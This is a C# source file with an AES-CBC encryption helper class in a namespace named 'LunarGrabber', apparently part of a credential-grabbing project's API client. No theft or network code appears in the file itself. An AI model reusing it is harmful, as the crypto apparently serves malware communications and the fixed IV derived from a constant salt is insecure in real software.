using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace LunarGrabber
{
	internal class Encryption
	{
		public static string APIService(string value)
		{
			string @string = Encoding.Default.GetString(Convert.FromBase64String(Constants.APIENCRYPTKEY));
			SHA256 sHA = SHA256.Create();
			byte[] key = sHA.ComputeHash(Encoding.ASCII.GetBytes(@string));
			byte[] bytes = Encoding.ASCII.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(Constants.APIENCRYPTSALT)));
			return EncryptString(value, key, bytes);
		}

		public static string EncryptService(string value)
		{
			string @string = Encoding.Default.GetString(Convert.FromBase64String(Constants.APIENCRYPTKEY));
			SHA256 sHA = SHA256.Create();
			byte[] key = sHA.ComputeHash(Encoding.ASCII.GetBytes(@string));
			byte[] bytes = Encoding.ASCII.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(Constants.APIENCRYPTSALT)));
			string text = EncryptString(value, key, bytes);
			int length = int.Parse(OnProgramStart.AID.Substring(0, 2));
			return text + Security.Obfuscate(length);
		}

		public static string DecryptService(string value)
		{
			string @string = Encoding.Default.GetString(Convert.FromBase64String(Constants.APIENCRYPTKEY));
			SHA256 sHA = SHA256.Create();
			byte[] key = sHA.ComputeHash(Encoding.ASCII.GetBytes(@string));
			byte[] bytes = Encoding.ASCII.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(Constants.APIENCRYPTSALT)));
			return DecryptString(value, key, bytes);
		}

		public static string EncryptString(string plainText, byte[] key, byte[] iv)
		{
			Aes aes = Aes.Create();
			aes.Mode = CipherMode.CBC;
			aes.Key = key;
			aes.IV = iv;
			MemoryStream memoryStream = new MemoryStream();
			ICryptoTransform transform = aes.CreateEncryptor();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
			byte[] bytes = Encoding.ASCII.GetBytes(plainText);
			cryptoStream.Write(bytes, 0, bytes.Length);
			cryptoStream.FlushFinalBlock();
			byte[] array = memoryStream.ToArray();
			memoryStream.Close();
			cryptoStream.Close();
			return Convert.ToBase64String(array, 0, array.Length);
		}

		public static string DecryptString(string cipherText, byte[] key, byte[] iv)
		{
			Aes aes = Aes.Create();
			aes.Mode = CipherMode.CBC;
			aes.Key = key;
			aes.IV = iv;
			MemoryStream memoryStream = new MemoryStream();
			ICryptoTransform transform = aes.CreateDecryptor();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
			string empty = string.Empty;
			try
			{
				byte[] array = Convert.FromBase64String(cipherText);
				cryptoStream.Write(array, 0, array.Length);
				cryptoStream.FlushFinalBlock();
				byte[] array2 = memoryStream.ToArray();
				return Encoding.ASCII.GetString(array2, 0, array2.Length);
			}
			finally
			{
				memoryStream.Close();
				cryptoStream.Close();
			}
		}

		public static string Decode(string text)
		{
			text = text.Replace('_', '/').Replace('-', '+');
			switch (text.Length % 4)
			{
			case 2:
				text += "==";
				break;
			case 3:
				text += "=";
				break;
			}
			return Encoding.UTF8.GetString(Convert.FromBase64String(text));
		}
	}
}
